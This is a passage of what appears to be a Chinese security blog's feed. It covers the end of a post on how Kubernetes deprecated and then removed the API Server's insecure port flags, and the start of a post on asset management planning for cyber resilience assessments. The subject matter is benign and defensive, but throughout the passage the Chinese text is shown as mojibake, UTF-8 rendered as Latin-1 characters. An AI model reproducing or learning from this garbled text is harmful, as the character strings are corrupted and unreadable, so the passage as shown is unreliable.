å®Œå…¨ç§»é™¤ã€‚</p><p>è‹¥æ‚¨è¿˜åœ¨ä½¿ç”¨è¿™ä¸¤ä¸ª Flagï¼ŒAPI Server å°†æŠ¥é”™ã€æ— æ³•å¯åŠ¨ã€‚è‡³æ­¤ï¼Œä¸å®‰å…¨çš„æœåŠ¡å°†å®Œå…¨é€€å‡ºå†å²èˆå°ã€‚</p><p><img src="/image/image_HjrwllqiXF.png" alt="å›¾ 9ï¼šKubernetes v1.24 çš„ Change Log"></p><p>å›¾ 9ï¼šKubernetes v1.24 çš„ Change Log</p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>æœ¬ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬è®¨è®ºäº† API Server ä¸å®‰å…¨æœåŠ¡çš„å‰ä¸–ä»Šç”Ÿã€‚åœ¨å®é™…å·¥ä½œå’Œå­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦è®°ä½ä¸€ç‚¹ï¼š<strong>ä»»ä½•ä¸è°ˆåŠ Kubernetes ç‰ˆæœ¬çš„å®‰å…¨é£é™©æŒ‡å—éƒ½æ˜¯è€æµæ°“</strong>ã€‚</p><p>å½“æˆ‘ä»¬è·å–åˆ°ä¸€ä¸ª Kubernetes é›†ç¾¤æ—¶ï¼Œéœ€è¦å…³æ³¨å…¶ç‰ˆæœ¬ä¿¡æ¯ï¼š</p><ul><li><p>2018 å¹´ 3 æœˆ 7 æ—¥ï¼ŒKubernetes å‘å¸ƒäº† v1.10.0 ç‰ˆæœ¬ï¼Œå®£ç§°å¼ƒç”¨<code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code> è¿™ä¸¤ä¸ªæ ‡å¿—ï¼Œè¿™ç›¸å½“äºè¢«å®£åˆ¤äº†â€œæ­»ç¼“â€ï¼Œå› ä¸ºæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ª Flagï¼Œå°† API Server é…ç½®ä¸ºå¯è¿œç¨‹è®¿é—®ã€‚</p></li><li><p>2020 å¹´ 12 æœˆ 9 æ—¥ï¼ŒKubernetes å‘å¸ƒäº† v1.20.0 ç‰ˆæœ¬ï¼Œåœ¨è¿™ä¹‹åï¼Œæ‚¨æ— æ³•å°† <code>--insecure-port</code> çš„è®¾ç½®ä¸ºé 0 å€¼ï¼Œå› ä¸º API Server ä¸å®‰å…¨æœåŠ¡å·²å…³é—­ã€‚</p></li><li><p>2022 å¹´ 5 æœˆ 25 æ—¥ï¼ŒKubernetes å‘å¸ƒäº† v1.24.0 ç‰ˆæœ¬ï¼ŒAPI Server ä¸å®‰å…¨æœåŠ¡å·²å®Œå…¨é€€å‡ºå†å²èˆå°ã€‚</p></li></ul><p>è¯´åˆ°è¿™é‡Œï¼Œä½ æ˜¯å¦éœ€è¦å»çœ‹çœ‹è‡ªå·±çš„é›†ç¾¤æ˜¯å“ªä¸ªç‰ˆæœ¬å‘¢ï¼Ÿ</p><p><img src="/image/image_3.png" alt="å›¾ 10ï¼šæ€»ç»“"></p><p>Kubernetes æ˜¯ä¸€ä¸ªéå¸¸è‘—åçš„å¼€æºé¡¹ç›®ï¼Œå®ƒç»“åˆäº†æ¥è‡ªä¸–ç•Œå„åœ°çš„å¼€æºçˆ±å¥½è€…çš„æ™ºæ…§å’ŒåŠ›é‡ï¼Œä¸æ–­çš„è¿›è¡Œæ›´æ–°ä¸è¿­ä»£ï¼Œä¹Ÿè®¸åœ¨ä»Šå¤©æˆ–æ˜å¤©ï¼Œå°±è§£å†³äº†æŸä¸ªå®‰å…¨é£é™©ã€æˆ–å¼•å…¥æ–°çš„å®‰å…¨é£é™©ã€‚</p><p>ä¸å®‰å…¨çš„æœåŠ¡æ‰€å¸¦æ¥çš„é£é™©è¢«å®Œå…¨è§£å†³äº†ï¼Œä½†å®‰å…¨çš„æœåŠ¡æœªå¿…å§‹ç»ˆæ˜¯å®‰å…¨çš„ã€‚ä¸‹ä¸€è®²ï¼Œæˆ‘ä»¬æ¥è¯´è¯´ Kubernetes å¼€æ”¾åœ¨ 6443 ç«¯å£çš„å®‰å…¨æœåŠ¡ï¼Œæ•¬è¯·æœŸå¾…ï½</p>]]></content>
    
    
    
    <tags>
      
      <tag>Kubernetes å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œå®‰å…¨éŸ§æ€§è¯„ä¼°ã€‘èµ„äº§ç®¡ç†é¢†åŸŸï¼ˆäºŒï¼‰ï¼šèµ„äº§ç®¡ç†è®¡åˆ’</title>
    <link href="/2024/11/14/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E8%AE%A1%E5%88%92/"/>
    <url>/2024/11/14/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨è¿™ä¸€è®²ä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨äº† 5W2H çš„æ–¹æ³•å¯¹èµ„äº§ç®¡ç†çš„è®¡åˆ’è¿›è¡Œäº†è§£è¯»ã€‚</p><p><img src="/image/648.png" alt="å›¾ 1:5W2H åˆ†ææ³•" title="å›¾ 1:5W2H åˆ†ææ³•"></p><p><img src="/image/649.png" alt="å›¾ 2ï¼šèµ„äº§ç®¡ç†è®¡åˆ’" title="å›¾ 2ï¼šèµ„äº§ç®¡ç†è®¡åˆ’"></p><p>åœ¨å¼€å¯èµ„äº§ç®¡ç†è®¡åˆ’ä¹‹å‰ï¼Œç»„ç»‡éœ€è¦å…ˆå®Œæˆå‡†å¤‡å·¥ä½œã€‚èµ„äº§ç®¡ç†è®¡åˆ’çš„ä¸»è¦å†…å®¹å¦‚ä¸‹æ‰€ç¤ºã€‚èµ„äº§ç®¡ç†è®¡åˆ’ç»“æŸåï¼Œä¼šéœ€è¦æœ‰ä¸ªè¾“å‡ºå†…å®¹ã€‚</p><p><img src="/image/650.png" alt="å›¾ 3ï¼šèµ„äº§ç®¡ç†è®¡åˆ’æ‰€åŒ…å«çš„å†…å®¹" title="å›¾ 3ï¼šèµ„äº§ç®¡ç†è®¡åˆ’æ‰€åŒ…å«çš„å†…å®¹"></p><h2 id="0x01-å‡†å¤‡å·¥ä½œ"><a href="#0x01-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01 å‡†å¤‡å·¥ä½œ"></a>0x01 å‡†å¤‡å·¥ä½œ</h2><p>ä¸‹é¢æ¸…å•æ€»ç»“äº†ç»„ç»‡åœ¨å¼€å§‹åˆ¶å®šèµ„äº§ç®¡ç†è®¡åˆ’ä¹‹å‰éœ€è¦å®Œæˆçš„ä»»åŠ¡ä»¥åŠéœ€è¦æ”¶é›†çš„ä¿¡æ¯ã€‚</p><table><thead><tr><th>è¾“å…¥</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>èŒƒå›´å£°æ˜</td><td>æœ¬å£°æ˜éœ€è¦å®šä¹‰èµ„äº§ç®¡ç†è®¡åˆ’å’Œæ–¹æ¡ˆéœ€è¦è§£å†³çš„é—®é¢˜ã€‚èµ„äº§ç®¡ç†è‡³å°‘åº”æ¶µç›–æ”¯æŒç»„ç»‡å…³é”®æœåŠ¡çš„æ‰€æœ‰èµ„äº§ã€‚ä¸ç¡®å®šä»ä½•å¤„ç€æ‰‹çš„ç»„ç»‡åº”å°†é‡ç‚¹æ”¾åœ¨æœ€åŸºæœ¬çš„æœåŠ¡å’Œç›´æ¥å½±å“å…¶ä½¿å‘½çš„é¢†åŸŸä¸Šã€‚è¿™ç§æ–¹æ³•å¯ä»¥è®©ç»„ç»‡é¦–å…ˆè§£å†³é£é™©æœ€å¤§çš„é¢†åŸŸï¼Œå¹¶å‡è½»å…¶å½±å“ã€‚å¦‚æœæ‚¨çš„ç»„ç»‡å‚ä¸è¿‡ç½‘ç»œå®‰å…¨éŸ§æ€§è¯„ä¼°ï¼Œé‚£ä¹ˆä»ç½‘ç»œå®‰å…¨éŸ§æ€§è¯„ä¼°æœŸé—´å¤„ç†çš„å…³é”®æœåŠ¡å¼€å§‹å¯èƒ½ä¼šæ¯”è¾ƒå¥½ã€‚</td></tr><tr><td>åˆ©ç›Šç›¸å…³è€…åå•</td><td>åˆ©ç›Šç›¸å…³è€…åå•åº”ä¸èŒƒå›´å£°æ˜ä¿æŒä¸€è‡´ï¼Œå¹¶åŒ…æ‹¬æ‰€æœ‰é€‚å½“çš„å†…éƒ¨å’Œå¤–éƒ¨å®ä½“ã€‚æ½œåœ¨å€™é€‰äººåŒ…æ‹¬ï¼š - æ‰§è¡Œå’Œé«˜çº§ç®¡ç†å±‚ - ä¸šåŠ¡çº¿è´Ÿè´£äººï¼Œå°¤å…¶æ˜¯å…³é”®æœåŠ¡æ‰€æœ‰è€… - ä¿¡æ¯æŠ€æœ¯ - æ³•åŠ¡ - è‘£äº‹ä¼š - æŠ€æœ¯ä¾›åº”å•† - ç›‘ç®¡æœºæ„å’Œå®¡è®¡å‘˜ - åˆè§„äººå‘˜</td></tr><tr><td>ç®¡ç†æ”¯æŒ</td><td>é«˜çº§ç®¡ç†å±‚å¯¹å»ºç«‹èµ„äº§ç®¡ç†ç¨‹åºå’Œå®æ–½æµç¨‹çš„æ”¯æŒ</td></tr><tr><td>å¯¹å¯æ¥å—çš„èµ„äº§ç®¡ç†æ–¹æ³•çš„ç†è§£å’Œè®¤å¯</td><td>ç®¡ç†å±‚å¯¹æ‹Ÿé‡‡ç”¨èµ„äº§ç®¡ç†æ–¹æ³•çš„æ¥å—ï¼ŒåŒ…æ‹¬åˆ©ç›Šç›¸å…³è€…å¯¹å·²è¯†åˆ«çš„å…³é”®èµ„äº§å’ŒæœåŠ¡å¯æ¥å—é£é™©å®¹å¿åº¦çš„æœŸæœ›ã€‚</td></tr><tr><td>å¤–éƒ¨å¼ºåŠ çš„èµ„äº§ç®¡ç†è¦æ±‚ã€‚</td><td>è§„å®šèµ„äº§å®šä¹‰çš„å¼ºåˆ¶æ€§è¦æ±‚çš„ç›‘ç®¡è¦æ±‚ï¼›è¿˜åŒ…æ‹¬å…¶ä»–éœ€æ±‚ï¼Œå¦‚æœåŠ¡æ°´å¹³åè®®è¦æ±‚ã€‚</td></tr><tr><td>é£é™©</td><td>åˆ†ç±»å’Œä¼˜å…ˆçº§æ’åºçš„é£é™©åˆ—è¡¨ã€‚</td></tr><tr><td>èµ„äº§ç®¡ç†çš„è´£ä»»åˆ†é…</td><td>èµ„äº§ç®¡ç†å·¥ä½œèŒè´£æè¿°ï¼Œä¾‹å¦‚ï¼šæ‰§è¡Œæ‰€æœ‰æƒã€å†³ç­–ã€æ²Ÿé€šã€æµ‹è¯•å’Œä¸­æ–­é£é™©ç®¡ç†ï¼š</td></tr><tr><td>èµ„äº§ç®¡ç†é¢„ç®—</td><td>è¯†åˆ«ç”¨äºæ‰§è¡Œèµ„äº§ç®¡ç†è§„åˆ’å’Œå®æ–½çš„å¯ç”¨èµ„é‡‘ï¼ŒåŒ…æ‹¬ï¼š - äººå‘˜èµ„æº - å·¥å…·ï¼ˆåº”ç”¨ç¨‹åºåŠç›¸å…³ç¡¬ä»¶ï¼‰ - ç¬¬ä¸‰æ–¹æ”¯æŒ - ç”¨äºçº æ­£èµ„äº§ç®¡ç†è¿‡ç¨‹ä¸­è¯†åˆ«å‡ºçš„é—®é¢˜çš„èµ„é‡‘</td></tr></tbody></table><h2 id="0x02-èµ„äº§ç®¡ç†è®¡åˆ’è·å¾—æ”¯æŒ"><a href="#0x02-èµ„äº§ç®¡ç†è®¡åˆ’è·å¾—æ”¯æŒ" class="headerlink" title="0x02 èµ„äº§ç®¡ç†è®¡åˆ’è·å¾—æ”¯æŒ"></a>0x02 èµ„äº§ç®¡ç†è®¡åˆ’è·å¾—æ”¯æŒ</h2><h3 id="2-1-ä¸ºä»€ä¹ˆéœ€è¦è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒï¼Ÿ"><a href="#2-1-ä¸ºä»€ä¹ˆéœ€è¦è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒï¼Ÿ" class="headerlink" title="2.1 ä¸ºä»€ä¹ˆéœ€è¦è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒï¼Ÿ"></a>2.1 ä¸ºä»€ä¹ˆéœ€è¦è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒï¼Ÿ</h3><p>è·å¾—ç®¡ç†å±‚çš„æ”¯æŒå¯¹äºç¡®ä¿èµ„äº§ç®¡ç†è®¡åˆ’çš„æœ‰æ•ˆå®æ–½è‡³å…³é‡è¦ã€‚</p><p>è‡ªä¸Šè€Œä¸‹çš„æ–¹æ³•é€šå¸¸æœ‰åŠ©äºç»„ç»‡çš„èµ„äº§ç®¡ç†è®¡åˆ’æ»¡è¶³å…¶éŸ§æ€§ç›®æ ‡ã€‚</p><h3 id="2-2-è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#2-2-è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="2.2 è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ"></a>2.2 è·å¾—é¢†å¯¼å±‚çš„æ”¯æŒçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>ç®¡ç†å±‚å¯ä»¥é€šè¿‡<strong>æä¾›é€‚å½“çš„èµ„é‡‘ã€ç›‘ç£å’Œäººå‘˜é…ç½®æ¥æ”¯æŒèµ„äº§ç®¡ç†è®¡åˆ’</strong>ã€‚</p><p>è‡ªä¸Šè€Œä¸‹çš„æ–¹æ³•è¿˜å¯ä»¥<strong>è®©èµ„äº§ç®¡ç†çš„ç»Ÿä¸€æ–¹æ³•è®ºèƒ½å¤Ÿè·¨è¶Šç»„ç»‡ç•Œé™è¿›è¡Œå®æ–½</strong>ã€‚</p><h3 id="2-3-éœ€è¦è·å–çš„é¢†å¯¼å±‚çš„æ”¯æŒç¨‹åº¦æ˜¯å¤šå°‘ï¼Ÿ"><a href="#2-3-éœ€è¦è·å–çš„é¢†å¯¼å±‚çš„æ”¯æŒç¨‹åº¦æ˜¯å¤šå°‘ï¼Ÿ" class="headerlink" title="2.3 éœ€è¦è·å–çš„é¢†å¯¼å±‚çš„æ”¯æŒç¨‹åº¦æ˜¯å¤šå°‘ï¼Ÿ"></a>2.3 éœ€è¦è·å–çš„é¢†å¯¼å±‚çš„æ”¯æŒç¨‹åº¦æ˜¯å¤šå°‘ï¼Ÿ</h3><p>**æ‰€éœ€çš„ç®¡ç†å±‚æ”¯æŒç¨‹åº¦å–å†³äºèµ„äº§åœ¨ç»„ç»‡ä¸­çš„ä½ç½®ã€‚**å¯¹äºæ¶‰åŠæ•´ä¸ªç»„ç»‡çš„èµ„äº§ç®¡ç†è®¡åˆ’ï¼Œéœ€è¦é«˜çº§æ‰§è¡Œå±‚çš„æ”¯æŒã€‚åƒæœåŠ¡å±‚é¢è¿™æ ·çš„è¾ƒå°è§„æ¨¡çš„å®æ–½ï¼Œå¯èƒ½åªéœ€è¦è´Ÿè´£è¯¥ç‰¹å®šæœåŠ¡çš„ç®¡ç†å±‚çš„æ”¯æŒã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªç”µåŠ›å…¬ç”¨äº‹ä¸šç»„ç»‡ä¸­ï¼Œè‹¥æœ‰å››ä¸ªä¸šåŠ¡å•ä½åˆ†åˆ«æä¾›å‘ç”µã€è¾“ç”µã€é…ç”µå’Œä¸šåŠ¡æ”¯æŒæœåŠ¡ï¼Œé‚£ä¹ˆæ¯ä¸ªä¸šåŠ¡å•ä½éƒ½æ„æˆäº†è¯¥ç»„ç»‡çš„ä¸€ä¸ªæœåŠ¡å±‚ã€‚</p><p>è‹¥è¦ä¸ºè¿™äº›æœåŠ¡å•ç‹¬å®æ–½èµ„äº§ç®¡ç†è®¡åˆ’ï¼Œé‚£ä¹ˆæ”¯æŒåº”è¯¥æ¥è‡ªå„è‡ªä¸šåŠ¡å•ä½çš„ç®¡ç†å±‚ï¼›è‹¥è¦æ±‚æ‰€æœ‰çš„ä¸šåŠ¡å•ä½å®æ–½å…±åŒçš„èµ„äº§ç®¡ç†è®¡åˆ’ï¼Œé‚£ä¹ˆæ”¯æŒåº”è¯¥æ¥è‡ªç”µåŠ›å…¬ç”¨äº‹ä¸šçš„èµ„æ·±ç®¡ç†å±‚ã€‚</p><h2 id="0x03-è¯†åˆ«æœåŠ¡"><a href="#0x03-è¯†åˆ«æœåŠ¡" class="headerlink" title="0x03 è¯†åˆ«æœåŠ¡"></a>0x03 è¯†åˆ«æœåŠ¡</h2><blockquote><p>è¿™é‡Œçš„æœåŠ¡æŒ‡çš„æ˜¯ç»„ç»‡åœ¨å±¥è¡ŒèŒè´£æˆ–ç”Ÿäº§äº§å“è¿‡ç¨‹ä¸­ï¼Œæ‰€è¿›è¡Œçš„æœ‰é™æ•°é‡çš„æ´»åŠ¨ã€‚</p></blockquote><h3 id="3-1-ä¸ºä»€ä¹ˆè¦è¯†åˆ«æœåŠ¡ï¼Ÿ"><a href="#3-1-ä¸ºä»€ä¹ˆè¦è¯†åˆ«æœåŠ¡ï¼Ÿ" class="headerlink" title="3.1 ä¸ºä»€ä¹ˆè¦è¯†åˆ«æœåŠ¡ï¼Ÿ"></a>3.1 ä¸ºä»€ä¹ˆè¦è¯†åˆ«æœåŠ¡ï¼Ÿ</h3><p>åœ¨ç»„ç»‡ä¸­è¯†åˆ«èµ„äº§å¯èƒ½æ˜¯ä¸€é¡¹è‰°å·¨çš„ä»»åŠ¡ï¼Œå› æ­¤ç»„ç»‡åº”é¦–å…ˆè¯†åˆ«å…¶æä¾›çš„æœåŠ¡ã€‚</p><p>ç„¶åï¼Œ<strong>ç»„ç»‡å¯ä»¥é€šè¿‡æ¢³ç†æ”¯æŒè¿™äº›æœåŠ¡çš„èµ„äº§æ¥è¯†åˆ«èµ„äº§ï¼Œå¹¶å°†èµ„äº§æ•´ä½“åˆ’åˆ†ä¸ºå¯ç®¡ç†çš„éƒ¨åˆ†</strong>ã€‚</p><h3 id="3-2-è¯†åˆ«æœåŠ¡çš„ä¿¡æ¯æ¥æºæœ‰å“ªäº›ï¼Ÿ"><a href="#3-2-è¯†åˆ«æœåŠ¡çš„ä¿¡æ¯æ¥æºæœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="3.2 è¯†åˆ«æœåŠ¡çš„ä¿¡æ¯æ¥æºæœ‰å“ªäº›ï¼Ÿ"></a>3.2 è¯†åˆ«æœåŠ¡çš„ä¿¡æ¯æ¥æºæœ‰å“ªäº›ï¼Ÿ</h3><p>æœåŠ¡é€šå¸¸ä¸ç‰¹å®šçš„ç»„ç»‡ç›¸å¯¹åº”ï¼Œä½†æœåŠ¡å¯ä»¥åœ¨ä¸šåŠ¡å•ä½ä¹‹é—´å…±äº«ï¼Œå¹¶è·¨è¶Šç»„ç»‡ç•Œé™ã€‚ä¾‹å¦‚ï¼Œå¤§å‹ç»„ç»‡çš„å…¨çƒä¾›åº”é“¾å°†è·¨è¶Šè®¸å¤šç»„ç»‡ç•Œé™ã€‚</p><p><strong>ç¡®å®šç»„ç»‡æœåŠ¡å¯èƒ½æœ‰ç”¨ä¿¡æ¯çš„æ¥æºåŒ…æ‹¬ï¼š</strong></p><ul><li><strong>æˆ˜ç•¥è®¡åˆ’</strong></li><li><strong>å•†ä¸šè®¡åˆ’</strong></li><li><strong>åˆåŒ</strong></li><li><strong>å®¢æˆ·è¯·æ±‚</strong></li><li><strong>æ ‡å‡†å·¥ä½œæµç¨‹</strong></li></ul><p>**æœåŠ¡å¯ä»¥æ˜¯é¢å‘å¤–éƒ¨ï¼Œä¹Ÿå¯ä»¥æ˜¯é¢å‘å†…éƒ¨çš„ã€‚**é¢å‘å¤–éƒ¨çš„æœåŠ¡é€šå¸¸æ˜¯é¢å‘å®¢æˆ·çš„ï¼Œè€Œä¸”é€šå¸¸æ˜¯å®¹æ˜“è¯†åˆ«çš„æœåŠ¡ï¼Œå› ä¸ºå®ƒä»¬æ¶‰åŠå·²çŸ¥çš„å•†å“ã€‚ä¸ºäº†å®ç°å¤–éƒ¨æœåŠ¡çš„ä½¿å‘½ï¼Œç»„ç»‡è¿˜åº”è¯¥è€ƒè™‘å…¶å†…éƒ¨æœåŠ¡ï¼Œä¾‹å¦‚ï¼šæ‹›è˜æµç¨‹ã€ç»©æ•ˆè¯„ä¼°å’ŒåŸ¹è®­è®¡åˆ’ç­‰ã€‚</p><p><img src="/image/651.png" alt="è¡¨ 2ï¼šä¸åŒçš„å…³é”®åŸºç¡€è®¾æ–½å’Œä»–ä»¬å¯èƒ½æä¾›çš„å…³é”®æœåŠ¡" title="è¡¨ 2ï¼šä¸åŒçš„å…³é”®åŸºç¡€è®¾æ–½å’Œä»–ä»¬å¯èƒ½æä¾›çš„å…³é”®æœåŠ¡"></p><blockquote><p>å†…éƒ¨æœåŠ¡ï¼šæŒ‡ç»„ç»‡å†…éƒ¨å„éƒ¨é—¨ã€å›¢é˜Ÿå’Œæµç¨‹ç­‰æä¾›çš„æ”¯æŒæ€§æœåŠ¡ï¼Œè¿™äº›æœåŠ¡ä¸ç›´æ¥é¢å‘å¤–éƒ¨å®¢æˆ·ï¼Œè€Œæ˜¯ç”¨äºå¸®åŠ©ç»„ç»‡å†…éƒ¨çš„å…¶ä»–å•ä½æœ‰æ•ˆåœ°è¿ä½œï¼Œä»¥ä¾¿å®ç°ç»„ç»‡çš„æ•´ä½“ç›®æ ‡å’Œä½¿å‘½ã€‚</p><p>å¤–éƒ¨æœåŠ¡ï¼šæŒ‡é‚£äº›ç›´æ¥é¢å‘å®¢æˆ·çš„æœåŠ¡ï¼Œå®ƒä»¬é€šå¸¸ä¸“æ³¨äºç»„ç»‡ç”Ÿäº§æˆ–æä¾›çš„å…·ä½“äº§å“ï¼Œç›®çš„æ˜¯æ»¡è¶³å¤–éƒ¨å®¢æˆ·çš„éœ€æ±‚ï¼Œå¢å¼ºå®¢æˆ·ä½“éªŒï¼Œå¹¶ä¿ƒè¿›ç»„ç»‡çš„å¸‚åœºè¡¨ç°å’Œä¸šåŠ¡å¢é•¿ã€‚</p></blockquote><h3 id="3-3-å¦‚ä½•è¿›è¡ŒæœåŠ¡è¯†åˆ«å·¥ä½œ"><a href="#3-3-å¦‚ä½•è¿›è¡ŒæœåŠ¡è¯†åˆ«å·¥ä½œ" class="headerlink" title="3.3 å¦‚ä½•è¿›è¡ŒæœåŠ¡è¯†åˆ«å·¥ä½œ"></a>3.3 å¦‚ä½•è¿›è¡ŒæœåŠ¡è¯†åˆ«å·¥ä½œ</h3><p>ä¸ºäº†æ–¹ä¾¿æœåŠ¡çš„è¯†åˆ«å·¥ä½œï¼Œç»„ç»‡åº”è€ƒè™‘<strong>ä½¿ç”¨ä¸€ç§æ–‡æ¡£è®°å½•æ–¹æ³•æ¥è·Ÿè¸ªå·²è¯†åˆ«çš„æœåŠ¡</strong>ï¼Œä¾‹å¦‚ï¼šç”µå­è¡¨æ ¼ã€é…ç½®æ§åˆ¶çš„æ–‡æ¡£æˆ–æ•°æ®åº“ç­‰ã€‚</p><p><img src="/image/652.png" alt="å›¾ 4ï¼šæœåŠ¡è®°å½•è¡¨æ ¼ç¤ºä¾‹" title="å›¾ 4ï¼šæœåŠ¡è®°å½•è¡¨æ ¼ç¤ºä¾‹"></p><h2 id="0x04-å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åº"><a href="#0x04-å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åº" class="headerlink" title="0x04 å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åº"></a>0x04 å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åº</h2><h3 id="4-1-ä¸ºä»€ä¹ˆè¦å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Ÿ"><a href="#4-1-ä¸ºä»€ä¹ˆè¦å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Ÿ" class="headerlink" title="4.1 ä¸ºä»€ä¹ˆè¦å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Ÿ"></a>4.1 ä¸ºä»€ä¹ˆè¦å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Ÿ</h3><p>ç»„ç»‡åœ¨è¯†åˆ«äº†æ‰€æä¾›çš„æ‰€æœ‰æœåŠ¡è¿‡åï¼Œåº”å½“å¯¹è¿™äº›æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Œä»¥ç¡®å®šé«˜ä»·å€¼æœåŠ¡ã€‚è¿™é‡Œçš„é«˜ä»·å€¼æœåŠ¡æŒ‡çš„æ˜¯ï¼šå¯¹äºç»„ç»‡å®Œæˆå…¶ä½¿å‘½è€Œè¨€ï¼Œè‡³å…³é‡è¦çš„æœåŠ¡ï¼Œä¸€æ—¦è¿™äº›æœåŠ¡å¤±è´¥ï¼Œå¯èƒ½ä¼šé˜»ç¢ç»„ç»‡æˆ˜ç•¥ç›®æ ‡çš„å®ç°ã€‚</p><p><img src="/image/653.png" alt="å›¾ 5ï¼šå…³é”®æœåŠ¡å¯èƒ½å› æµç¨‹å¤±è´¥æˆ–ç‰¹å®šèµ„äº§ï¼ˆå¦‚ä¿¡æ¯å’ŒæŠ€æœ¯ï¼‰çš„å¤±è´¥è€Œå—åˆ°å¹²æ‰°" title="å›¾ 5ï¼šå…³é”®æœåŠ¡å¯èƒ½å› æµç¨‹å¤±è´¥æˆ–ç‰¹å®šèµ„äº§ï¼ˆå¦‚ä¿¡æ¯å’ŒæŠ€æœ¯ï¼‰çš„å¤±è´¥è€Œå—åˆ°å¹²æ‰°"></p><h3 id="4-2-å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºåº”è€ƒè™‘çš„å› ç´ æœ‰å“ªäº›ï¼Ÿ"><a href="#4-2-å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºåº”è€ƒè™‘çš„å› ç´ æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="4.2 å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºåº”è€ƒè™‘çš„å› ç´ æœ‰å“ªäº›ï¼Ÿ"></a>4.2 å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºåº”è€ƒè™‘çš„å› ç´ æœ‰å“ªäº›ï¼Ÿ</h3><p>ç»„ç»‡å¿…é¡»æ ¹æ®æœåŠ¡çš„ä¼˜å…ˆçº§ï¼Œæ¥ä¸ºæœåŠ¡åˆ†é…ä»·å€¼ã€‚åœ¨ä¼˜å…ˆçº§æ’åºå’Œä»·å€¼åˆ†é…æ—¶ï¼Œç»„ç»‡åº”è¯¥è€ƒè™‘å¦‚ä¸‹å› ç´ ï¼š</p><ul><li><strong>ä¸šåŠ¡å½±å“åˆ†æï¼ˆbusiness impacts analysisï¼Œç®€ç§° BIAï¼‰çš„ç»“æœ</strong></li><li><strong>æœåŠ¡æˆ–ä¸šåŠ¡è¿ç»­æ€§è®¡åˆ’</strong></li><li><strong>åœ¨é£é™©è¯„ä¼°æ´»åŠ¨ä¸­è¯†åˆ«çš„æœåŠ¡é£é™©åæœ</strong></li><li><strong>æˆ˜ç•¥ç›®æ ‡</strong></li><li><strong>å®‰å…¨åˆ†ç±»</strong></li></ul><h3 id="4-3-å¦‚ä½•è¿›è¡Œä¼˜å…ˆçº§æ’åºå·¥ä½œ"><a href="#4-3-å¦‚ä½•è¿›è¡Œä¼˜å…ˆçº§æ’åºå·¥ä½œ" class="headerlink" title="4.3 å¦‚ä½•è¿›è¡Œä¼˜å…ˆçº§æ’åºå·¥ä½œ"></a>4.3 